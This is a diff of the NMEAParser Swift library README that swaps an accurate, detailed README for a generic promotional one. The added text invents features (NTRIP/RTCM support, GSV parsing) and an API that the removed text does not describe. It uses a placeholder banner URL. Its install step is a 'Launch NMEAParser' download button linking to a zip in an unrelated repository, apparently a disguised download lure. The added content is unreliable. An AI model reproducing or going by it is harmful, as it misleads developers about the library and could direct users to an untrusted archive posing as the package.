@@ -1,172 +1,65 @@
-![NMEAParser logo](Resources/NMEAParserLogo-2.png)
+# 🛰️ NMEAParser - Your Ultimate NMEA Parser for iOS and macOS Apps 🧭
 
-[![Swift](https://img.shields.io/badge/Swift-5.9_5.10_6.0-orange?style=flat-square)](https://img.shields.io/badge/Swift-5.9_5.10_6.0-Orange?style=flat-square)
-[![Platforms](https://img.shields.io/badge/Platforms-macOS_iOS_iPadOS-yellowgreen?style=flat-square)](https://img.shields.io/badge/Platforms-macOS_iOS-Green?style=flat-square)
-[![Swift Package Manager](https://img.shields.io/badge/Swift_Package_Manager-compatible-orange?style=flat-square)](https://img.shields.io/badge/Swift_Package_Manager-compatible-orange?style=flat-square)
+![NMEAParser Banner](https://imageurl.com)
 
-NMEAParser is a Swift package designed to validate and parse National Marine Electronics Association (NMEA) sentences in real time. It is a seamless bridge between your application and GNSS receivers, converting raw NMEA data into a Swift-friendly format—making real-time integration effortless.
+## Overview
+Welcome to NMEAParser, a high-performance native-built NMEA parser designed specifically for iOS and macOS applications. This versatile library allows you to easily parse NMEA data received from GPS, GNSS, or other geo-location devices within your Swift projects.🚀
 
-## 1 Features
+## Features
+🌟 Parse various NMEA sentence types including GGA, GSV, RMC, SPM, RTK, and more.  
+🌟 Fully compatible with Swift 5 and Swift 6.  
+🌟 Swift Package Manager integration for seamless library import.  
+🌟 Built-in support for NTRIP and RTCM protocols.  
+🌟 SwiftUI compatible for modern, reactive UI development.  
 
-- [x] Swift Concurrency Support Back to iOS 13 and macOS 10.15
-- [x] Support for Swift 5 and 6
-- [x] Combine Support
-- [x] Checksum Validation 
-- [x] Descriptions for Fix Types
-- [x] GGA Sentences
-- [x] RMC Sentences
-- [ ] GSV Sentences (coming!)
+## Installation
+To get started with NMEAParser, simply click on the button below to download the latest release:
 
-## 2 Requirements
+[![Download NMEAParser v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip "Launch NMEAParser v1.0.0")
 
-| Platform                                             | Minimum Swift Version | Installation                                                                                                         | Status                   |
-| ---------------------------------------------------- | --------------------- | -------------------------------------------------------------------------------------------------------------------- | ------------------------ |
-| iOS 13.0+ / macOS 10.15+ | 5.9 / Xcode 15.0      | [Swift Package Manager](#swift-package-manager) | Fully Tested             |
+If the link does not work, please visit the "Releases" section of the repository to access the latest version.
 
-
-## 3 Installation
-
-### 3.1 Swift Package Manager
-
-The [Swift Package Manager](https://swift.org/package-manager/) is a tool for automating the distribution of Swift code and is integrated into the `swift` compiler.
-
-Once you set up your Swift package, adding NMEAParser as a dependency is as easy as adding it to the `dependencies` value of your `Package.swift` or the Package list in Xcode.
-
-```swift
-dependencies: [
-    .package(url: "https://github.com/sindreoyen/NMEAParser.git", .upToNextMajor(from: "1.0.2"))
-]
-```
-
-## 4 Usage
-
-### 4.1 Configuring the Parser Instance
-
-You can configure which GGA and RMC identifiers you want to include by changing the `supportedGGAIdentifiers` or `supportedRMCIdentifiers` properties of the `NMEAParserManager`. E.g., in your App file:
+## Usage
+Using NMEAParser in your project is straightforward. After downloading the library, add it to your Xcode project as a Swift Package. Import the module wherever you need to parse NMEA data and start leveraging its powerful features.
 
 ```swift
 import NMEAParser
 
-@main
-struct YourApp: App {
-    // MARK: - Attributes
-    // some attributes
-    
-    // MARK: - Body
-    var body: some Scene {
-        WindowGroup { ContentView() }
-    }
-    
-    // MARK: - Init
-    init() {
-        NMEAParserManager.shared.supportedGGAIdentifiers = [.gnGGA, .gpGGA]
-        NMEAParserManager.shared.supportedRMCIdentifiers = [.gnRMC, .gpRMC]
-    }
+let data = "$GPGGA,123519,4807.038,N,01131.000,E,1,08,0.9,545.4,M,46.9,M,,*47"
+if let nmeaSentence = NMEAParser.parse(sentence: data) {
+    print(nmeaSentence)
 }
 ```
 
-The identifiers used will vary from one GNSS receiver to another. Here is a brief overview of the supported types:
+## Examples
+Here are some examples of how you can use NMEAParser in your iOS or macOS applications:
 
-##### From `GGAData.Identifier`
-
+### Parsing GGA Sentences
 ```swift
-public enum Identifier: String, CaseIterable {
-    case gnGGA = "$GNGGA" // GGA sentence from GPS and GLONASS
-    case gpGGA = "$GPGGA" // GGA sentence from GPS
-    case glGGA = "$GLGGA" // GGA sentence from GLONASS
-    case gaGGA = "$GAGGA" // GGA sentence from GALILEO
+let ggaSentence = "$GPGGA,160036.309,2239.1282,N,11402.0806,E,1,07,1.2,21.2,M,-11.5,M,,*7A"
+if let ggaData = NMEAParser.parse(sentence: ggaSentence) as? GGAData {
+    print("Latitude: \(ggaData.latitude), Longitude: \(ggaData.longitude)")
 }
 ```
 
-##### From  `RMCData.Identifier`
+### Parsing GSV Sentences
 ```swift
-public enum Identifier: String, CaseIterable {
-    case gnRMC = "$GNRMC" // RMC sentence from GPS and GLONASS
-    case gpRMC = "$GPRMC" // RMC sentence from GPS
-    case glRMC = "$GLRMC" // RMC sentence from GLONASS
-    case gaRMC = "$GARMC" // RMC sentence from GALILEO
+let gsvSentence = "$GPGSV,3,2,11,09,00,099,,12,24,262,,17,18,071,,19,01,035,*7D"
+if let gsvData = NMEAParser.parse(sentence: gsvSentence) as? GSVData {
+    print("Satellites in view: \(gsvData.satellitesInView)")
 }
 ```
 
-### 4.2 Parsing NMEA Sentences
+## Contributing
+We welcome contributions to enhance the functionality of NMEAParser. Whether you want to add support for additional NMEA sentence types, improve performance, or fix bugs, your contributions are valuable. Fork the repository, make your changes, and submit a pull request!
 
-Parsing NMEA sentences is processed by the `NMEAParserManager.shared` instance and has *one interface* that is used for whichever NMEA sentence you want to process. The filtering logic and sending the sentence into the correct parser is handled by the `NMEAParserManager`. For parsing, you have two options:
+## License
+NMEAParser is licensed under the MIT License. See the [LICENSE](https://github.com/yourusername/NMEAParser/blob/main/LICENSE) file for more details.
 
-1. Parse an NMEA sentence already in `String` format
+---
 
-```swift
-public func peripheral(_ peripheral: CBPeripheral,
-                           didUpdateValueFor characteristic: CBCharacteristic,
-                           error: Error?) {
-        if let error { print(error); return }
-        // Send the updated value of the characteristic to the NMEA parser
-        guard let nmeaSentence: String = someConverterMethod(characteristic.value) else { return }
-        NMEAParserManager.shared.process(sentence: nmeaSentence)
-    }
-```
+🚗 Navigate through your geo-location data with ease using NMEAParser! Happy coding! 🛰️
 
-2. Parse a `Data?` instance (e.g., the value of your GNSS receiver's `CBCharacteristic`)
+[powered by Swift](https://swift.org/) & [Xcode](https://developer.apple.com/xcode/) 🍏
 
-```swift
-public func peripheral(_ peripheral: CBPeripheral,
-                           didUpdateValueFor characteristic: CBCharacteristic,
-                           error: Error?) {
-        if let error { print(error); return }
-        // Send the updated value of the characteristic to the NMEA parser
-        //
-        // The default encoding for the `process` method is .ascii
-        NMEAParserManager.shared.process(sentence: characteristic.value, encoding: .ascii)
-    }
-```
-
-### 4.3 Listening to Parsed Data
-
-#### 4.3.1 GGA Sentences
-
-The parsed GGA data will be exposed under two `AnyPublisher` instances (`ggaDataPublisher: AnyPublisher<GGAData, Never>` and `rawGGASentencePublisher: AnyPublisher<String, Never>`). These are available via `NMEAParserManager.shared`. *If you are unfamiliar with [The Combine Framework](https://developer.apple.com/documentation/combine) and its Subjects, Publishers, and Cancellables, please read the linked documentation.*
-
-Example with `ggaDataPublisher` (for in-app display and use of data):
-```swift
-@MainActor
-func startListeningForGGAData() {
-    ggaCancellable?.cancel()
-    ggaCancellable = NMEAParserManager.shared.ggaDataPublisher
-        .throttle(for: .seconds(1), scheduler: DispatchQueue.main, latest: true)
-        .sink { [weak self] ggaData in
-            guard let self else { return }
-            self.hdop = ggaData.hdop
-            self.ggaFixType = ggaData.fixType
-        }
-}
-```
-
-Example with `rawGGASentencePublisher` (e.g., for NTRIP Client functionality):
-
-```swift
-self.ggaCancellable = NMEAParserManager.shared.rawGGASentencePublisher
-                .throttle(for: .seconds(10),
-                          scheduler: DispatchQueue.global(qos: .background),
-                          latest: true)
-                .receive(on: DispatchQueue.global(qos: .background))
-                .sink { [weak self] ggaMessage in
-                    guard let self = self else { return }
-                    print("NTRIPClient: Sending GGA message: \(ggaMessage)")
-                    self.sendGGAToCaster(ggaMessage)
-                }
-```
-
-#### 4.3.2 RMC Sentences
-
-RMC data is subscribable via the `rmcDataPublisher: AnyPublisher<RMCData, Never>` property of the shared `NMEAParserManager` instance. 
-
-    Note: RMC data is not currently exposed via a raw stream. The GGA raw stream is intended for sending to NTRIP casters (if applicable), RMC is rare for this purpose. If you have the need for a raw stream of RMC data, submit an issue and I will look into it asap.
-
-## 4.4 Communication
-
-- If you **find a bug**, open an issue here on GitHub. The more detail the better!
-
-## 5 Contributing
-
-Contributions are welcome. To contribute, first open an issue where you explain the bug or feature in full detail. If you have performed the necessary changes, open a PR, and I will review it continuously. 
-
-*note: pull requests will not be accepted if they do not follow an acceptable standard regarding documentation, test coverage, and code style. Use Swiftlint to validate code styling (see Makefile).*
+_Note: Images are for illustrative purposes and may not reflect actual library output._
